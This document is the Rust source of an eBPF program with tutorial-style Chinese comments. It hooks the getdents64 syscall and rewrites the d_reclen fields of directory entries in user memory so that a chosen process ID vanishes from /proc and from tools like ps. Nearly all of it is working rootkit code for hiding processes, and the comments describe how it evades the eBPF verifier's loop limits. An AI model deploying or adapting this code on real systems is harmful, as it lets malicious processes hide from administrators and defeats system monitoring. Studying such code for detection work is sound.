#![no_std]
#![no_main]

use aya_ebpf::{
    helpers::{
        bpf_get_current_pid_tgid, bpf_probe_write_user,
        gen::{bpf_probe_read_user, bpf_probe_read_user_str},
    },
    macros::{map, tracepoint},
    maps::{HashMap, ProgramArray},
    programs::TracePointContext,
};
use aya_log_ebpf::info;
use core::mem::size_of_val;
use hide_me_common::*;
use vmlinux::vmlinux::linux_dirent64;

#[path = "./vmlinux/mod.rs"]
mod vmlinux;

// 表示 handle_getdents_enter 在 JUMP_TABLE 中的索引号
const ENTER: u32 = 0;

// 表示 handle_getdents_patch 在 JUMP_TABLE 中的索引号
const PARCHER: u32 = 1;

// 尾调用表，存储了一系列函数指针，类似于中断向量表
#[map]
static JUMP_TABLE: ProgramArray = ProgramArray::with_max_entries(2, 0);

// 存储使用 sys_getdents64 的 pid_tgid 和 linux_dirent64 结构体首地址的映射
#[map]
static map_buffs: HashMap<usize, u64> = HashMap::<usize, u64>::with_max_entries(8192, 0);

// 存储 pid_tgid 和 获取目前 linux_dirent64 结构体数组的遍历偏移 的映射
#[map]
static map_bytes_read: HashMap<usize, usize> = HashMap::<usize, usize>::with_max_entries(8192, 0);

// 记录上一次遍历到的位置
// 主要是为了 handle_getdents_patch 函数使用，
// 因为 handle_getdents_patch 函数需要知道上一个 linux_dirent64 结构体的大小
// 以便于修正上一个 linux_dirent64 结构体的大小
// 从而隐藏我们要隐藏的 pid
#[map]
static map_to_patch: HashMap<usize, usize> = HashMap::<usize, usize>::with_max_entries(8192, 0);

#[tracepoint]
pub fn hide_me(ctx: TracePointContext) -> u32 {
    // sys_enter_getdents64 入口点
    handle_getdents_enter(ctx).unwrap_or_else(|the_ret| the_ret)
}

// sys_getdents64 的入口实际处理函数
fn handle_getdents_enter(ctx: TracePointContext) -> Result<u32, u32> {
    // 获得要隐藏的 pid
    let the_target_pid = unsafe { target_pid };

    // 如果 pid 为 0，表示不需要隐藏，直接返回
    if the_target_pid == 0 {
        return Ok(0);
    }

    // 获得调用 sys_enter_getdents64 的进程的 pid 与 tgid
    let pid_tgid = bpf_get_current_pid_tgid() as usize;

    // linux_dirent64 结构体在内存的排列是连续的，
    // 而且 sys_getdents64的第二个参数 dirent 正好指向第一个 linux_dirent64 结构体，
    // 所以根据上面的信息，我们只要知道 linux_dirent64 链表的大小，
    // 就能根据 linux_dirent64->d_reclen，
    // 就能准确从连续的内存中分割出每一块linux_dirent64。

    // 获取 linux_dirent64 结构体首地址
    let dirp: *const linux_dirent64 = unsafe { ctx.read_at(24).unwrap() };

    // 把 pid_tgid -> dirp 的映射存储到 map_buffs 中
    map_buffs.insert(&pid_tgid, &(dirp as u64), 0).unwrap();

    Ok(0)
}

// sys_enter_getdents64 的收尾处理函数
#[tracepoint]
fn handle_getdents_exit(ctx: TracePointContext) -> Result<u32, u32> {
    // 获得调用 sys_exit_getdents64 的进程的 pid 与 tgid
    // 用来判断是之前调用 sys_enter_getdents64 的进程
    let pid_tgid = bpf_get_current_pid_tgid() as usize;

    // 读取 sys_exit_getdents64 的 ret 参数字段，即 linux_dirent64 结构体数组的总长度
    let total_bytes_read: i64 = unsafe { ctx.read_at(16).unwrap() };

    // 要是总长度为零，那就直接退出。
    if total_bytes_read <= 0 {
        return Ok(0);
    }

    // 从 map_buffs 中获取存储的 linux_dirent64 数组首地址
    let pbuff_addr = unsafe { map_buffs.get(&pid_tgid) };

    // 如果没有找到，直接返回，这是必须做的，否则无法通过 ebpf 校验器
    if pbuff_addr.is_none() {
        return Ok(0);
    }

    let pbuff_addr = pbuff_addr.unwrap();

    // 获取当前 linux_dirent64 结构体数组首地址
    let buff_addr = *pbuff_addr;

    // 记录当前 linux_dirent64 结构体大小
    let mut d_reclen: u16 = 0;

    // 记录当前的搜索地址
    let mut dirp: *const linux_dirent64 = core::ptr::null();

    // 记录当前搜索到的 pid 号
    // 在 linux 下，我们排查系统运行的进程实际上是通过访问 /proc 伪文件系统实现的，
    // 包括 ps 命令,我们可以通过 strace 来查看 ps 使用的系统调用来验证这一说法。
    // 查到的 pid 本质上都是一个个以 pid 为名字的文件夹
    // 所以我们最后还需要通过比对 char 数组来判断我们是否找到了要隐藏的 pid
    let mut filename: [u8; MAX_FILE_LEN] = [0; MAX_FILE_LEN];

    // 记录当前遍历的偏移
    let mut bpos: usize = 0;

    // 从 map_bytes_read 中获取目前 linux_dirent64 结构体数组的遍历偏移
    let pBPOS = unsafe { map_bytes_read.get(&pid_tgid) };

    // 赋值给 bpos，第一次进入 handle_getdents_exit 时，
    // map_bytes_read 中还什么都没有，
    // 所以第一次执行时 bpos 为 0
    if let Some(pBPOS) = pBPOS {
        bpos = *pBPOS;
    } else {
        bpos = 0;
    }

    // 开始在 linux_dirent64 结构体数组中遍历搜索，
    // 由于 ebpf 校验器不允许循环，
    // 所以我们通过尾调用的方式绕过 ebpf 对循环的限制，
    // 具体来说就是将原来的循环拆分成大小为 128 的块，
    // 一轮循环结束后，记录当前遍历的位置 bpos，
    // 通过 bpf_tail_call 再次调用这个函数进行遍历，
    // 直到找到对应的文件名
    for _ in 0..128 {
        // 如果当前遍历的位置大于等于总长度，说明已经遍历完了
        if bpos >= total_bytes_read as usize {
            break;
        }

        // 计算当前的 linux_dirent64 结构体地址
        dirp = (buff_addr + bpos as u64) as *const linux_dirent64;

        unsafe {
            // 读取当前 linux_dirent64 结构体的 d_reclen 字段
            // 即这个结构体的大小
            bpf_probe_read_user(
                &d_reclen as *const _ as *mut core::ffi::c_void,
                size_of_val(&d_reclen) as u32,
                &((*dirp).d_reclen) as *const _ as *const core::ffi::c_void,
            );

            // 对 pid_to_hide_len 的长度进行校验
            // 通过 ebpf 校验器
            // 虽说 pid_to_hide_len 的最大长度为 10 ……
            if pid_to_hide_len >= 11 {
                return Ok(0);
            }

            // 读取当前 linux_dirent64 结构体的 d_name 字段
            // 即这个结构体的文件名
            // 即 pid
            bpf_probe_read_user_str(
                filename.as_mut_ptr() as *mut core::ffi::c_void,
                pid_to_hide_len,
                (*dirp).d_name.as_ptr() as *const core::ffi::c_void,
            );

            // 比对文件名
            // 即比对 pid
            let mut j: usize = 0;
            while j < pid_to_hide_len as usize {
                if filename[j] != pid_to_hide[j] {
                    break;
                }
                j += 1;
            }

            // 如果找到了，
            // 就从 map_bytes_read 和 map_buffs 中移除当前的 pid_tgid 映射，
            // 并且尾调用到 handle_getdents_patch 函数，
            if j == pid_to_hide_len as usize {
                map_bytes_read.remove(&pid_tgid).unwrap();
                map_buffs.remove(&pid_tgid).unwrap();

                // 一定要这么写，
                // 最次也要写成这样：
                // JUMP_TABLE.tail_call(&ctx, PROG_HANDLER);
                // 如果写成这样：
                // JUMP_TABLE.tail_call(&ctx, PROG_HANDLER).unwrap();
                // 就会报错 ——
                // Error: the BPF_PROG_LOAD syscall failed.
                // Verifier output: last insn is not an exit or jmp
                // 这是因为 .unwrap() 如果 panic，
                // 就会导致程序进入不可达的 panic_handler，
                // #[panic_handler]
                // fn panic(_info: &core::panic::PanicInfo) -> ! {
                //     unsafe { core::hint::unreachable_unchecked() }
                // }
                // 所以校验器不予通过
                // 总而言之，横着看，竖着看，就是一句话 ——
                // 一定要在检查 Some 或 Ok 之后再 unwrap
                // ebpf 根本不为 panic 负责
                if JUMP_TABLE.tail_call(&ctx, PARCHER).is_err() {
                    return Ok(0);
                }
            }
        }

        // 记录上一次遍历到的位置
        // 主要是为了 handle_getdents_patch 函数使用，
        // 因为 handle_getdents_patch 函数需要知道上一个 linux_dirent64 结构体的大小
        // 以便于修正上一个 linux_dirent64 结构体的大小
        // 从而隐藏我们要隐藏的 pid
        map_to_patch.insert(&pid_tgid, &(dirp as usize), 0).unwrap();

        // 记录当前遍历的位置
        bpos += d_reclen as usize;
    }

    // 如果当前遍历的位置小于总长度，且还没有找到要隐藏的 pid，
    // 说明还没有遍历完，
    // 就尾调用到 handle_getdents_exit 函数，
    // 继续遍历搜索
    if bpos < total_bytes_read as usize {
        map_bytes_read.insert(&pid_tgid, &bpos, 0).unwrap();

        unsafe {
            if JUMP_TABLE.tail_call(&ctx, ENTER).is_err() {
                return Ok(0);
            }
        }
    }

    // 如果当前遍历的位置等于总长度，说明已经遍历完了都没有找到
    // 心灰意冷，云游去也。
    map_bytes_read.remove(&pid_tgid).unwrap();
    map_buffs.remove(&pid_tgid).unwrap();

    return Ok(0);
}

// 这个函数是用来修正 linux_dirent64 结构体的大小的
// 从而隐藏我们要隐藏的 pid
#[tracepoint]
fn handle_getdents_patch(ctx: TracePointContext) -> Result<u32, u32> {
    // 获得调用 sys_exit_getdents64 的进程的 pid 与 tgid
    // 判断是否是之前调用 sys_enter_getdents64 的进程
    let pid_tgid = bpf_get_current_pid_tgid() as usize;

    // 从 map_to_patch 中获取上一个 linux_dirent64 结构体的地址
    let pbuff_addr = unsafe { map_to_patch.get(&pid_tgid) };
    if pbuff_addr.is_none() {
        return Ok(0);
    }
    let &pbuff_addr = pbuff_addr.unwrap();

    // 转换一下类型
    let dirp_previous = pbuff_addr as *mut linux_dirent64;

    // 记录上一个 linux_dirent64 结构体的 d_reclen 字段
    let d_reclen_previous: u16 = 0;

    // 读取上一个 linux_dirent64 结构体的 d_reclen 字段
    unsafe {
        bpf_probe_read_user(
            &d_reclen_previous as *const _ as *mut core::ffi::c_void,
            size_of_val(&d_reclen_previous) as u32,
            &((*dirp_previous).d_reclen) as *const _ as *const core::ffi::c_void,
        );
    }

    // 计算当前 linux_dirent64 结构体的地址
    let dirp = (pbuff_addr as u64 + d_reclen_previous as u64) as *mut linux_dirent64;

    // 记录当前 linux_dirent64 结构体的 d_reclen 字段
    let d_reclen: u16 = 0;

    // 读取当前 linux_dirent64 结构体的 d_reclen 字段
    unsafe {
        bpf_probe_read_user(
            &d_reclen as *const _ as *mut core::ffi::c_void,
            size_of_val(&d_reclen) as u32,
            &((*dirp).d_reclen) as *const _ as *const core::ffi::c_void,
        );
    }

    // 修正上一个 linux_dirent64 结构体的 d_reclen 字段
    // 从而覆盖当前的 linux_dirent64 结构体
    let d_reclen_new = d_reclen_previous + d_reclen;

    // 写入用户内存空间中去
    let ret = unsafe {
        bpf_probe_write_user(
            &((*dirp_previous).d_reclen) as *const _ as *mut u16,
            &d_reclen_new,
        )
    };

    // 如果写入失败，打印日志返回
    // 如果写入成功，从 map_to_patch 中移除当前的 pid_tgid 映射
    // 然后返回
    if ret.is_err() {
        info!(&ctx, "failed to correct");
        return Ok(0);
    } else {
        info!(&ctx, "succeed to correct");
    }

    map_to_patch.remove(&pid_tgid).unwrap();
    return Ok(0);
}

#[panic_handler]
fn panic(_info: &core::panic::PanicInfo) -> ! {
    unsafe { core::hint::unreachable_unchecked() }
}
